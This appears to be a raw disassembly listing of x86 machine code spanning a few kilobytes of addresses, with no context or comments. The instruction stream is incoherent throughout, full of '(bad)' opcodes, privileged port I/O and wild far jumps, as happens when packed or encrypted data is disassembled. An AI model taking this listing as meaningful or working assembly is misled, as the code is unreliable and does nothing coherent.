  412aed:	test   BYTE PTR [ebp+0x2908a8f4],dl
  412af3:	mov    ah,0x2a
  412af5:	dec    esp
  412af6:	pop    edx
  412af7:	jo     0x412b44
  412af9:	mov    bl,0x7b
  412afb:	sbb    DWORD PTR [ebx],esp
  412afd:	mov    eax,0x5a64e0f3
  412b02:	nop
  412b03:	jo     0x412b4f
  412b05:	clc    
  412b06:	mov    esi,0xa22a175a
  412b0b:	jle    0x412b04
  412b0d:	lods   al,BYTE PTR ds:[esi]
  412b0e:	aad    0x5a
  412b10:	xor    eax,0xe09a60c9
  412b15:	xor    eax,0x20892485
  412b1a:	int    0x11
  412b1c:	adc    BYTE PTR [ebx],0xa8
  412b1f:	dec    ebp
  412b20:	lahf   
  412b21:	pusha  
  412b22:	out    0x5c,eax
  412b24:	fcomp  QWORD PTR [ecx-0x483cdc10]
  412b2a:	sbb    ebp,0xffffff8e
  412b2d:	xor    BYTE PTR [edx],0x6
  412b30:	cwde   
  412b31:	and    ch,ah
  412b33:	sub    al,bh
  412b35:	xlat   BYTE PTR ds:[ebx]
  412b36:	retf   0x7c2b
  412b39:	dec    ecx
  412b3a:	test   ah,0x12
  412b3d:	imul   ecx
  412b3f:	fisttp QWORD PTR [edi+edi*8]
  412b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b43:	bound  eax,QWORD PTR [ecx]
  412b45:	mov    dh,0xd3
  412b47:	lahf   
  412b48:	mov    eax,0x18cdcf2
  412b4d:	rcr    DWORD PTR [esi],cl
  412b4f:	or     eax,0x3e1b624b
  412b54:	inc    esp
  412b55:	or     BYTE PTR ds:0x5a9368d7,bl
  412b5b:	jb     0x412bbb
  412b5d:	jae    0x412bd7
  412b5f:	cmp    BYTE PTR [ebp-0x6b],0x43
  412b63:	sub    DWORD PTR [esi+0x4271a0d9],0xf7ce4b8
  412b6d:	xchg   edx,eax
  412b6e:	push   ebp
  412b6f:	jmp    0x412b1f
  412b71:	pop    eax
  412b72:	mov    bh,0x16
  412b74:	ror    al,cl
  412b76:	js     0x412b1e
  412b78:	mov    ah,0x9b
  412b7a:	aad    0x9
  412b7c:	mov    BYTE PTR ds:0x54cbaf47,bl
  412b82:	in     eax,dx
  412b83:	daa    
  412b84:	or     BYTE PTR ds:0x14c78808,al
  412b8a:	mov    edi,0xf06f6994
  412b8f:	cmp    BYTE PTR [eax],0x3b
  412b92:	fidivr WORD PTR [edi]
  412b94:	or     BYTE PTR [ebx+0x2af55b26],ah
  412b9a:	scas   eax,DWORD PTR es:[edi]
  412b9b:	mov    DWORD PTR [eax+ecx*2+0x3979fa2],ebx
  412ba2:	xor    eax,0x5ae51ba6
  412ba7:	jp     0x412bae
  412ba9:	mov    bl,0x13
  412bab:	mov    esp,0x453af0b2
  412bb0:	pop    edx
  412bb1:	sub    BYTE PTR [ecx-0x51],bl
  412bb4:	int3   
  412bb5:	mov    eax,0xdb6ef253
  412bba:	ja     0x412b8d
  412bbc:	mov    bh,0x7d
  412bbe:	fwait
  412bbf:	lods   al,BYTE PTR gs:[esi]
  412bc1:	loop   0x412c0e
  412bc3:	lock or ecx,DWORD PTR [ebx+edx*8+0x25438dd9]
  412bcb:	loop   0x412b8e
  412bcd:	icebp  
  412bce:	ret    
  412bcf:	ret    
  412bd0:	pop    ds
  412bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd2:	js     0x412bef
  412bd4:	jno    0x412b6c
  412bd6:	cli    
  412bd7:	imul   ebp,DWORD PTR [edi*8+0x1eb2eafe],0x1b
  412bdf:	xchg   DWORD PTR [edi+0x60603065],ebx
  412be5:	sub    BYTE PTR [eax+0x3de4e5e9],cl
  412beb:	fisttp WORD PTR [edx-0x557c38ab]
  412bf1:	xchg   esi,eax
  412bf2:	sub    eax,0xdfc6ac4d
  412bf7:	inc    ebp
  412bf8:	push   edi
  412bf9:	dec    esp
  412bfa:	jp     0x412bf9
  412bfc:	and    dl,BYTE PTR [eax+0x7e165c51]
  412c02:	mov    eax,0xbcd8b2a0
  412c07:	inc    ecx
  412c08:	jmp    0x3a82082d
  412c0d:	sahf   
  412c0e:	repnz xchg ecx,eax
  412c10:	call   0xf05f8cd2
  412c15:	stos   DWORD PTR es:[edi],eax
  412c16:	add    ebp,edi
  412c18:	inc    ebp
  412c19:	or     al,0x22
  412c1b:	sub    al,0x94
  412c1d:	add    DWORD PTR [edi],edx
  412c1f:	in     al,dx
  412c20:	sub    eax,0x28135795
  412c25:	pop    esi
  412c26:	jns    0x412bb1
  412c28:	call   0xbd6e:0x4f9d9c0b
  412c2f:	and    al,0xf5
  412c31:	div    DWORD PTR [ebx-0x70508543]
  412c37:	inc    edi
  412c38:	xor    eax,0xa908d7a
  412c3d:	ds jmp 0x412bfa
  412c40:	push   es
  412c41:	xchg   edx,eax
  412c42:	fsubr  st(2),st
  412c44:	mov    edi,0x188cb382
  412c49:	mov    dh,ah
  412c4b:	lds    ebp,FWORD PTR [ecx+ecx*1-0x19]
  412c4f:	push   0xfffffffc
  412c51:	mov    ecx,0x7cfcffc0
  412c56:	adc    al,ch
  412c58:	pop    ebp
  412c59:	inc    ebx
  412c5a:	pop    edx
  412c5b:	cmp    ebx,DWORD PTR [edi-0x25]
  412c5e:	fisttp WORD PTR [edi-0x5]
  412c61:	(bad)  
  412c62:	adc    cl,BYTE PTR [edx-0x45c4ea57]
  412c68:	sbb    ch,dl
  412c6a:	sbb    ch,bh
  412c6c:	imul   eax,DWORD PTR [edx+0x55],0xffffffff
  412c70:	xor    BYTE PTR [ecx+0x3d],dh
  412c73:	xchg   esp,eax
  412c74:	es pop edx
  412c76:	inc    edx
  412c77:	mov    eax,0xc789c9
  412c7c:	mov    edx,0xcffc280a
  412c81:	out    dx,eax
  412c82:	push   ecx
  412c83:	sbb    DWORD PTR [edx+ebx*4+0x2172ee04],ebx
  412c8a:	jno    0x412cec
  412c8c:	push   ebp
  412c8d:	retf   
  412c8e:	push   esi
  412c8f:	add    dl,0x48
  412c92:	adc    eax,0xc9f47688
  412c97:	xor    BYTE PTR [ecx-0x30],0x3
  412c9b:	fdivr  st,st(1)
  412c9d:	mov    ah,0x69
  412c9f:	mov    al,0x4c
  412ca1:	xchg   ebx,eax
  412ca2:	xlat   BYTE PTR ds:[ebx]
  412ca3:	in     al,0x6a
  412ca5:	into   
  412ca6:	or     BYTE PTR [esi+0x4d338cea],cl
  412cac:	push   esi
  412cad:	jo     0x412c52
  412caf:	cli    
  412cb0:	adc    bh,BYTE PTR [eax]
  412cb2:	sub    cl,BYTE PTR [edx]
  412cb4:	icebp  
  412cb5:	push   ds
  412cb6:	cwde   
  412cb7:	cmp    edx,DWORD PTR [edi+0x6c]
  412cba:	cdq    
  412cbb:	xchg   edx,eax
  412cbc:	mov    ebx,0x722ca11
  412cc1:	or     DWORD PTR [edx+0x7567fc1f],edi
  412cc7:	js     0x412d39
  412cc9:	lea    ecx,[eax-0x3930d674]
  412ccf:	jmp    0xabfebb37
  412cd4:	clc    
  412cd5:	inc    esi
  412cd6:	leave  
  412cd7:	in     eax,dx
  412cd8:	push   ebx
  412cd9:	jb     0x412d50
  412cdb:	popf   
  412cdc:	cli    
  412cdd:	in     eax,0x8
  412cdf:	shr    BYTE PTR [esi+0x273f0747],0x81
  412ce6:	lock sbb DWORD PTR [edx-0x164e0f15],ebp
  412ced:	popa   
  412cee:	pop    es
  412cef:	fsubr  QWORD PTR [esi+0xf]
  412cf2:	imul   esp,DWORD PTR ss:[eax-0xc641fab],0x96a72dea
  412cfd:	dec    edi
  412cfe:	mov    eax,0xef919d88
  412d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d04:	fnsave [ebp+0x64]
  412d07:	in     al,dx
  412d08:	jp     0x412ce0
  412d0a:	sbb    cl,BYTE PTR [edi]
  412d0c:	(bad)
  412d0f:	imul   ecx,DWORD PTR [ebx],0xe31026ba
  412d15:	push   0x127d68c2
  412d1a:	cmp    BYTE PTR [ecx-0x1fd8faf5],dl
  412d20:	mov    eax,ds:0xfb8324a9
  412d25:	sahf   
  412d26:	scas   al,BYTE PTR es:[edi]
  412d27:	mov    ebp,0x9a52bd04
  412d2c:	inc    edi
  412d2d:	jmp    0x871:0xdb4f9249
  412d34:	jl     0x412cd6
  412d36:	loopne 0x412d17
  412d38:	gs sar bh,1
  412d3b:	mov    al,0x36
  412d3d:	aaa    
  412d3e:	jnp    0x412d12
  412d40:	dec    ebx
  412d41:	rdpmc  
  412d43:	inc    esi
  412d44:	pushf  
  412d45:	jae    0x412cdf
  412d47:	pop    edx
  412d48:	dec    eax
  412d49:	in     eax,0x2b
  412d4b:	int3   
  412d4c:	mov    DWORD PTR ds:0xa07f1d3,ecx
  412d52:	cli    
  412d53:	adc    dl,al
  412d55:	cmp    al,0xc5
  412d57:	movzx  ebp,WORD PTR [edx]
  412d5a:	and    DWORD PTR [ecx],esp
  412d5c:	stc    
  412d5d:	mov    edi,0x63a3c5af
  412d62:	je     0x412dca
  412d64:	xchg   edi,eax
  412d65:	add    ebx,DWORD PTR [eax+0x4c]
  412d68:	mov    bl,0x6b
  412d6a:	jo     0x412cee
  412d6c:	rol    DWORD PTR [ebp+0x5e],cl
  412d6f:	pop    eax
  412d70:	dec    esp
  412d71:	or     bl,ch
  412d73:	push   edi
  412d74:	(bad)  
  412d75:	ss fwait
  412d77:	pop    ecx
  412d78:	sub    al,bh
  412d7a:	iret   
  412d7b:	jecxz  0x412d10
  412d7d:	mov    ebp,gs
  412d7f:	adc    DWORD PTR [ecx-0x77],eax
  412d82:	mov    al,0xa6
  412d84:	jl     0x412d63
  412d86:	or     al,0x7e
  412d88:	mov    DWORD PTR [eax+0x3a],edx
  412d8b:	stc    
  412d8c:	(bad)  
  412d8d:	adc    eax,0xe781a832
  412d92:	pop    esp
  412d94:	mov    edi,0xf7a7e821
  412d99:	stos   DWORD PTR es:[edi],eax
  412d9a:	add    esi,DWORD PTR [edi-0x49410ea8]
  412da0:	ds mov ah,0xa4
  412da3:	jmp    0x4b2284a8
  412da8:	pop    ecx
  412da9:	jge    0x412e11
  412dab:	test   BYTE PTR ss:[ecx+0x55],dl
  412daf:	sbb    BYTE PTR [ebx],dl
  412db1:	mov    bh,0x34
  412db3:	imul   edx,DWORD PTR [edi-0x49bc6259],0xafcf108d
  412dbd:	add    DWORD PTR [edi+0x41633347],edx
  412dc3:	xchg   esi,eax
  412dc4:	jb     0x412e30
  412dc6:	mov    ds:0x485e80f6,al
  412dcb:	inc    edx
  412dcc:	add    eax,0xad71351a
  412dd1:	or     dh,BYTE PTR [edx-0x5a]
  412dd4:	out    dx,eax
  412dd5:	in     eax,dx
  412dd6:	mov    esp,0x8bd894b4
  412ddb:	js     0xc71f52de
  412de1:	jb     0x412d8d
  412de3:	push   edi
  412de4:	sahf   
  412de5:	mov    edi,0x55dc05ab
  412dea:	repz cs retf 0x4dc
  412def:	mov    eax,ds:0x339bf3c6
  412df4:	jg     0x412da6
  412df6:	les    esi,FWORD PTR [ebp-0x41131b3b]
  412dfc:	into   
  412dfd:	push   ds
  412dfe:	outs   dx,BYTE PTR ds:[esi]
  412dff:	mov    edi,0xcf499afa
  412e04:	fld    DWORD PTR [ebx-0x2f]
  412e07:	pusha  
  412e08:	sbb    eax,0xf5963f73
  412e0d:	adc    bl,BYTE PTR [edx+edi*1]
  412e10:	nop
  412e11:	fsub   st(3),st
  412e13:	ficom  WORD PTR gs:[esi]
  412e16:	lods   al,BYTE PTR ds:[esi]
  412e17:	fst    QWORD PTR [edx-0x10]
  412e1a:	ins    BYTE PTR es:[edi],dx
  412e1b:	sub    BYTE PTR [eax+0x626ce270],ch
  412e21:	inc    esp
  412e22:	and    DWORD PTR [edi],ebx
  412e24:	(bad)
  412e28:	int    0x15
  412e2a:	loop   0x412e6c
  412e2c:	aam    0xc7
  412e2e:	push   ss
  412e2f:	inc    edi
  412e30:	xor    eax,0x37fbc439
  412e35:	ret    0xe436
  412e38:	push   ds
  412e39:	xor    BYTE PTR [eax-0x666ee853],ah
  412e3f:	add    bl,0xb5
  412e42:	dec    esi
  412e43:	xchg   esp,eax
  412e44:	test   eax,0xa0d598b5
  412e49:	mov    ebp,0xf8ffbe0c
  412e4e:	sub    bh,BYTE PTR [esi+eiz*8-0x6743f415]
  412e55:	mov    ah,0xdc
  412e57:	add    al,0x63
  412e59:	imul   ebx,DWORD PTR [eax-0x601e294b],0xffffff85
  412e60:	rol    DWORD PTR [edx],0x85
  412e63:	test   al,0x88
  412e65:	pop    ss
  412e66:	loopne 0x412ee5
  412e68:	sbb    edi,DWORD PTR [ecx+eax*2]
  412e6b:	mov    al,0x50
  412e6d:	inc    edx
  412e6e:	leave  
  412e6f:	dec    edx
  412e70:	mov    ch,0x29
  412e72:	fs or  al,0xea
  412e75:	pop    DWORD PTR [esi-0x70db0667]
  412e7b:	cli    
  412e7c:	popf   
  412e7d:	test   BYTE PTR [ebp+0x16],al
  412e80:	imul   edx,DWORD PTR [ecx],0x59f1b72b
  412e86:	jne    0x412eed
  412e88:	mov    bh,0x11
  412e8a:	cwde   
  412e8b:	push   ecx
  412e8c:	xchg   bh,ch
  412e8e:	mov    ch,0x2f
  412e90:	test   DWORD PTR ds:0xd58c92e3,edx
  412e96:	out    dx,eax
  412e97:	test   dh,0x26
  412e9a:	mov    ebp,0x9e5d181b
  412e9f:	test   eax,0x728747a
  412ea4:	frstor [eax]
  412ea6:	jbe    0x412ef9
  412ea8:	adc    ebp,edx
  412eaa:	(bad)  
  412eab:	aad    0x1b
  412ead:	mov    ecx,0xecf838ae
  412eb2:	pop    edx
  412eb3:	fsubp  st(5),st
  412eb5:	mov    ah,dl
  412eb7:	mov    cl,0x54
  412eb9:	jne    0x412f2d
  412ebb:	popf   
  412ebc:	sti    
  412ebd:	jg     0x412e49
  412ebf:	push   es
  412ec0:	stos   DWORD PTR es:[edi],eax
  412ec1:	sbb    dl,BYTE PTR [eax+ebx*8]
  412ec4:	push   ss
  412ec5:	(bad)  
  412ec6:	jae    0x412e5c
  412ec8:	jmp    0xe69:0x3990fac9
  412ecf:	mov    ds:0x25f35c53,al
  412ed4:	pop    edx
  412ed5:	or     ecx,DWORD PTR [edx+ebx*1+0x57]
  412ed9:	popa   
  412eda:	stc    
  412edb:	or     DWORD PTR [edx-0x30281e5f],edi
  412ee1:	pop    edx
  412ee2:	xor    BYTE PTR ds:0x26d0aabb,0xe0
  412ee9:	(bad)  
  412eea:	jno    0x412eac
  412eec:	sbb    DWORD PTR [ecx-0x76b2f0c],edx
  412ef2:	aad    0xf9
  412ef4:	sbb    cl,BYTE PTR [edi-0x27955e5f]
  412efa:	imul   edx,DWORD PTR [esp+eax*8-0x2e],0x26
  412eff:	test   eax,0x25e6a48f
  412f04:	inc    ebx
  412f05:	aad    0xb5
  412f07:	jle    0x412efa
  412f09:	sub    dl,BYTE PTR [esi-0x44]
  412f0c:	aas    
  412f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f0e:	pop    ebx
  412f0f:	(bad)  
  412f10:	jmp    FWORD PTR [ebp+eax*4-0x77]
  412f14:	adc    al,0xfd
  412f16:	mov    dl,0xc0
  412f18:	lea    ecx,[edx]
  412f1a:	jnp    0x412f8c
  412f1c:	xchg   esp,eax
  412f1d:	repnz cmp ebp,DWORD PTR [ebx-0x1f6cfc8e]
  412f24:	or     BYTE PTR [edi],dl
  412f26:	aad    0x13
  412f28:	inc    eax
  412f29:	into   
  412f2a:	add    dl,BYTE PTR [ecx]
  412f2c:	ss (bad) 
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	jns    0x412f1e
  412f31:	add    BYTE PTR [esi],dh
  412f33:	mov    ebp,0x81eb7bd
  412f38:	ins    DWORD PTR es:[edi],dx
  412f39:	ja     0x412f91
  412f3b:	loope  0x412ef0
  412f3d:	or     ecx,DWORD PTR [edi+eax*8]
  412f40:	xchg   BYTE PTR [edx],bl
  412f42:	ins    DWORD PTR es:[edi],dx
  412f43:	popa   
  412f44:	sbb    esi,0x9deccc6
  412f4a:	pop    ebp
  412f4b:	jge    0x412eeb
  412f4d:	jmp    0x412f5f
  412f4f:	or     DWORD PTR [edx],0x16
  412f52:	add    eax,0xef96471e
  412f57:	std    
  412f58:	inc    ebp
  412f59:	retf   0x979a
  412f5c:	xchg   ecx,eax
  412f5d:	adc    eax,eax
  412f5f:	cmp    al,0xd0
  412f61:	mov    esi,0xd535e356
  412f66:	adc    eax,0x167f3480
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	xchg   edx,eax
  412f6d:	fist   DWORD PTR [edx+eax*8+0x4a]
  412f71:	cli    
  412f72:	jns    0x412f7f
  412f74:	shl    bh,0xa5
  412f77:	retf   
  412f78:	addr16 aas 
  412f7a:	ja     0x412ff4
  412f7c:	inc    esp
  412f7d:	mov    ebp,0xcfde8b
  412f82:	mov    bh,0x11
  412f84:	sbb    dl,BYTE PTR [ebx]
  412f86:	jns    0x412f52
  412f88:	test   BYTE PTR [edi-0x71],cl
  412f8b:	add    ebx,DWORD PTR [edx]
  412f8d:	popf   
  412f8e:	jp     0x412f30
  412f90:	aas    
  412f91:	sub    ecx,DWORD PTR [edi+0x47]
  412f94:	jl     0x413010
  412f96:	loopne 0x412f9f
  412f98:	shl    bl,cl
  412f9a:	icebp  
  412f9b:	imul   DWORD PTR [edx+0x1a15708c]
  412fa1:	cli    
  412fa2:	imul   esp,DWORD PTR [eax-0x9fa83b9],0x3b7d3a58
  412fac:	mov    ch,0x3f
  412fae:	lock icebp 
  412fb0:	cmp    DWORD PTR [ecx+0x58],esp
  412fb3:	pop    esp
  412fb4:	loope  0x412fed
  412fb6:	in     al,dx
  412fb7:	xchg   ecx,eax
  412fb8:	out    0xa1,eax
  412fba:	dec    ebx
  412fbb:	repz xor ebx,edi
  412fbe:	lea    ecx,[ecx+ebx*8-0xebbd751]
  412fc5:	cmp    DWORD PTR [eax+0x3ab8b3c2],0x11
  412fcc:	fcomp  st(6)
  412fce:	or     DWORD PTR [ebx+0x24238f0],0x5b792737
  412fd8:	in     al,dx
  412fd9:	push   es
  412fda:	pop    edi
  412fdb:	ins    DWORD PTR es:[edi],dx
  412fdc:	add    dh,BYTE PTR [ecx-0x4c]
  412fdf:	mov    bl,0xb7
  412fe1:	in     eax,dx
  412fe2:	push   0x467e5bcd
  412fe7:	dec    ebx
  412fe8:	add    dl,BYTE PTR [esi]
  412fea:	cmc    
  412feb:	mov    edx,edi
  412fed:	cdq    
  412fee:	adc    eax,0x6656e366
  412ff3:	inc    edi
  412ff4:	inc    ebx
  412ff5:	mov    eax,0xe7a8aee1
  412ffa:	or     BYTE PTR [eax+0x7592025e],bh
  413000:	and    dh,BYTE PTR [ebx]
  413002:	cli    
  413003:	pop    esp
  413004:	add    edx,ecx
  413006:	je     0x412fd9
  413008:	inc    edx
  413009:	(bad)  
  41300a:	sbb    DWORD PTR [eax-0x6a],ebp
  41300d:	push   ecx
  41300e:	mov    ebp,0x539af8e9
  413013:	dec    eax
  413014:	cmp    eax,0x9c814494
  413019:	repnz popf 
  41301b:	and    eax,0x3e32d855
  413020:	fadd   DWORD PTR [eax+0x15]
  413023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413024:	xchg   ebx,eax
  413025:	(bad)  
  413027:	mov    ds:0x9e8b1415,al
  41302c:	arpl   sp,bp
  41302e:	mov    dl,0x3
  413030:	leave  
  413031:	dec    edi
  413032:	inc    ebx
  413033:	adc    al,0x71
  413035:	cmp    DWORD PTR [ecx-0x3e6b9429],0xfffffff5
  41303c:	imul   ebx,edi,0x31
  41303f:	(bad)  
  413040:	arpl   WORD PTR [ecx-0x62],di
  413043:	(bad)  
  413044:	mov    ds:0x41a3bf25,al
  413049:	data16 scas al,BYTE PTR es:[edi]
  41304b:	push   es
  41304c:	fdiv   DWORD PTR [eax+ecx*8]
  41304f:	lods   eax,DWORD PTR ds:[esi]
  413050:	sub    DWORD PTR [edi+0x51d1a141],esi
  413056:	icebp  
  413057:	(bad)  
  413058:	mov    WORD PTR gs:[ebx-0x54c3704d],fs
  41305f:	shl    DWORD PTR ds:0xa7161403,cl
  413065:	inc    ecx
  413066:	mov    eax,ds:0xa3c6595c
  41306b:	adc    ah,ah
  41306d:	xor    al,0xc7
  41306f:	push   es
  413070:	pop    ebx
  413071:	xor    BYTE PTR [eax+0x503d8206],al
  413077:	jno    0x41309b
  413079:	mov    al,ds:0x631d95f3
  41307e:	ja     0x413060
  413080:	imul   ebp,ecx,0xfffffff2
  413083:	dec    ecx
  413084:	out    dx,al
  413085:	push   cs
  413086:	popf   
  413087:	sub    al,0xb1
  413089:	mov    DWORD PTR [ebx-0x7],ecx
  41308c:	xchg   DWORD PTR [edx+0x5b44a234],eax
  413092:	lods   al,BYTE PTR ds:[esi]
  413093:	pop    es
  413094:	add    al,0x51
  413096:	push   esp
  413097:	cli    
  413098:	xchg   esp,eax
  413099:	cdq    
  41309a:	xor    ch,dl
  41309c:	popf   
  41309d:	lods   eax,DWORD PTR cs:[esi]
  41309f:	push   esp
  4130a0:	pop    esp
  4130a1:	dec    ebp
  4130a2:	call   0xdc499588
  4130a7:	xor    eax,0xa8953096
  4130ac:	out    dx,eax
  4130ad:	dec    esp
  4130ae:	cmp    eax,0xba5b7526
  4130b3:	inc    ebx
  4130b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130b5:	adc    eax,0x8b0c1bcb
  4130ba:	jp     0x4130f8
  4130bc:	pusha  
  4130bd:	fsubp  st(3),st
  4130bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130c0:	add    bl,ah
  4130c2:	(bad)  
  4130c3:	mov    fs,edx
  4130c5:	push   ebx
  4130c6:	ret    
  4130c7:	icebp  
  4130c8:	(bad)  
  4130c9:	xchg   edx,eax
  4130ca:	imul   edx,ebx,0x4fbaae05
  4130d0:	outs   dx,BYTE PTR ds:[esi]
  4130d1:	loop   0x4130bc
  4130d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d4:	lds    esi,FWORD PTR [ecx]
  4130d6:	js     0x4130e7
  4130d8:	(bad)  
  4130d9:	iret   
  4130da:	mov    ebx,0x8411dfbc
  4130df:	loope  0x41312f
  4130e1:	js     0x4130b4
  4130e3:	xchg   ebp,eax
  4130e4:	jp     0x41306e
  4130e6:	jno    0x4130c2
  4130e8:	sub    BYTE PTR [di+0x61],bl
  4130ec:	jecxz  0x4130e8
  4130ee:	push   di
  4130f0:	mov    esi,0xe408ce12
  4130f5:	pusha  
  4130f6:	inc    edi
  4130f7:	int    0xe9
  4130f9:	sub    al,0x35
  4130fb:	jbe    0x4130ec
  4130fd:	lea    ebp,[edi]
  4130ff:	dec    esp
  413100:	push   edx
  413101:	test   eax,0xc6f8a6a9
  413106:	dec    esp
  413107:	xchg   esi,eax
  413108:	xor    eax,0x223f866c
  41310d:	data16 sbb al,0xa0
  413110:	jl     0x4130df
  413112:	bound  esi,QWORD PTR [edx+ebx*1-0x1c]
  413116:	pop    ss
  413117:	lock sub DWORD PTR [edx+0x33ea1305],ebp
  41311e:	icebp  
  41311f:	es aaa 
  413121:	out    dx,al
  413122:	xlat   BYTE PTR ds:[ebx]
  413123:	call   0xae02fba0
  413128:	popa   
  413129:	scas   eax,DWORD PTR es:[edi]
  41312a:	sbb    BYTE PTR [esi+0x47],0xd8
  41312e:	pop    ebx
  41312f:	(bad)  
  413130:	dec    esp
  413131:	and    dl,BYTE PTR [edx-0x70]
  413134:	mov    ds:0x6843534e,eax
  413139:	mov    WORD PTR [eax+ecx*8-0x5117542b],ds
  413140:	scas   al,BYTE PTR es:[edi]
  413141:	mov    esi,0x5c94d69b
  413146:	repnz fisttp WORD PTR [esi]
  413149:	inc    esi
  41314a:	and    DWORD PTR [edx],0x94816f64
  413150:	inc    ebx
  413151:	push   esi
  413152:	dec    ebp
  413153:	imul   BYTE PTR [edx+0x21]
  413156:	push   0x68
  413158:	adc    al,0x60
  41315a:	pop    es
  41315b:	push   esp
  41315c:	pusha  
  41315d:	sub    dl,ch
  41315f:	mov    dh,0x71
  413161:	mov    DWORD PTR [ebx-0x49],0x70c092e1
  413168:	push   eax
  413169:	(bad)  
  41316a:	in     al,dx
  41316b:	push   edi
  41316c:	rcl    cl,0x36
  41316f:	js     0x4131c5
  413171:	mov    bl,0x6
  413173:	es sahf 
  413175:	aam    0x39
  413177:	retf   
  413178:	jmp    0x41311b
  41317a:	(bad)  
  41317b:	addr16 in eax,0x1
  41317e:	repnz mov eax,0xded353fe
  413184:	lock or esi,DWORD PTR [edi-0x3cc48878]
  41318b:	sbb    DWORD PTR [esi-0x52],eax
  41318e:	inc    edi
  41318f:	leave  
  413190:	lds    ebx,FWORD PTR [esi]
  413192:	sbb    eax,0xdbf5d929
  413197:	or     eax,0xf197157a
  41319c:	test   al,0x49
  41319e:	jge    0x413124
  4131a0:	ror    DWORD PTR [edx-0x3b],cl
  4131a3:	retf   0xd8bf
  4131a6:	std    
  4131a7:	cmp    ebx,esi
  4131a9:	test   esi,ecx
  4131ab:	mov    ecx,0xaea8b2b2
  4131b0:	inc    edx
  4131b1:	test   al,0xb2
  4131b3:	shl    DWORD PTR [ecx-0x38],cl
  4131b6:	jae    0x413141
  4131b8:	cmp    BYTE PTR [edi+0x3d9d592],dh
  4131be:	fwait
  4131bf:	inc    edi
  4131c0:	pop    ebx
  4131c1:	sbb    al,0xa3
  4131c3:	cmp    DWORD PTR [esi+0x75],eax
  4131c6:	fild   QWORD PTR ds:0x57c0b829
  4131cc:	test   al,0x45
  4131ce:	mov    edi,0x391da3f6
  4131d3:	cmp    al,0xbf
  4131d5:	std    
  4131d6:	ja     0x41316f
  4131d8:	mov    ch,0xa5
  4131da:	outs   dx,BYTE PTR ds:[esi]
  4131db:	loopne 0x413203
  4131dd:	cmp    eax,0x3c095fae
  4131e2:	adc    al,0xd
  4131e4:	(bad)  
  4131e5:	sub    BYTE PTR [edx-0x1d47e1f0],bh
  4131eb:	std    
  4131ec:	jmp    0x901c5d39
  4131f1:	movnti DWORD PTR [ecx+edx*4-0x31277b04],ebx
  4131f9:	xchg   DWORD PTR [ecx-0x31eb45d1],ebp
  4131ff:	mov    bh,0xd6
  413201:	mov    al,ds:0x91f77248
  413206:	or     eax,0x4967121e
  41320b:	dec    edi
  41320c:	(bad)  
  41320d:	xchg   esi,eax
  41320e:	enter  0xac49,0x3
  413212:	pop    ecx
  413213:	xlat   BYTE PTR es:[ebx]
  413215:	mov    bl,0x14
  413217:	xor    ch,al
  413219:	in     al,0xb8
  41321b:	dec    edx
  41321c:	add    ebx,0x1a
  41321f:	mov    ch,0x5d
  413221:	aam    0xd4
  413223:	sti    
  413224:	fdivrp st(2),st
  413226:	jae    0x41324f
  413228:	xchg   DWORD PTR [ebx],esi
  41322a:	ds fs dec esi
  41322d:	out    0x8c,al
  41322f:	dec    edi
  413230:	mov    ebx,0xfbecacb2
  413235:	jmp    0x4131eb
  413237:	jl     0x41323c
  413239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41323a:	add    bl,0x7f
  41323d:	xchg   ebx,eax
  41323e:	ret    
  41323f:	xor    eax,0x35434813
  413244:	loopne 0x413259
  413246:	inc    esp
  413247:	shl    cl,cl
  413249:	cwde   
  41324a:	iret   
  41324b:	xor    DWORD PTR [esi-0x7e17e6ce],0xffffffbd
  413252:	mov    cl,bh
  413254:	cmp    ebx,ecx
  413256:	ror    BYTE PTR [ebp+0x2],cl
  413259:	cmp    BYTE PTR ds:0xd054d317,ch
  41325f:	xor    al,BYTE PTR [esi]
  413261:	push   0xffffff8f
  413263:	imul   ebp,DWORD PTR [ebp-0x44],0xffffffe2
  413267:	cmp    ah,BYTE PTR [eax-0x77]
  41326a:	int    0x44
  41326c:	inc    edx
  41326d:	jno    0x41324f
  41326f:	cmp    BYTE PTR [edi+0x32e33f6b],bl
  413275:	ds jns 0x413272
  413278:	repnz inc ecx
  41327a:	push   ss
  41327b:	repz sbb ch,BYTE PTR [edx+0x5c]
  41327f:	or     ebx,esp
  413281:	aaa    
  413282:	add    ebx,DWORD PTR [ebx-0x44]
  413285:	or     BYTE PTR [ecx-0x60b06051],al
  41328b:	jmp    0x67f6:0x52f0f2ed
  413292:	sbb    DWORD PTR [esi],edi
  413294:	cmp    BYTE PTR [ecx],0xd8
  413297:	sar    eax,0xd5
  41329a:	in     eax,0x28
  41329c:	mov    esi,DWORD PTR [ebx]
  41329e:	in     al,0x75
  4132a0:	mov    ss,eax
  4132a2:	pop    ss
  4132a3:	adc    DWORD PTR [eax],edx
  4132a5:	clc    
  4132a6:	(bad)  
  4132a8:	fucomi st,st(0)
  4132aa:	mov    ebx,0x63330f8d
  4132af:	xchg   ebp,eax
  4132b0:	loopne 0x4132f6
  4132b2:	mov    dl,0x30
  4132b4:	shl    DWORD PTR [edx+ebx*4],cl
  4132b7:	xchg   ebx,eax
  4132b8:	sbb    eax,0xbd191d63
  4132bd:	nop
  4132be:	(bad)  [esi]
  4132c0:	hlt    
  4132c1:	fucom  st(6)
  4132c3:	(bad)  
  4132c4:	aam    0xd7
  4132c6:	dec    eax
  4132c7:	in     eax,dx
  4132c8:	adc    BYTE PTR [edi],ah
  4132ca:	mov    BYTE PTR [eax-0x6c],ch
  4132cd:	imul   edx,ebx,0x3817dac5
  4132d3:	cmp    dl,ah
  4132d5:	pop    es
  4132d6:	call   0x827aa192
  4132db:	jne    0x41335a
  4132dd:	fwait
  4132de:	mov    dh,0xd4
  4132e0:	xchg   edx,eax
  4132e1:	fld    QWORD PTR [eax+ebx*2-0x37856118]
  4132e8:	sub    al,0x50
  4132ea:	(bad)  
  4132eb:	js     0x413295
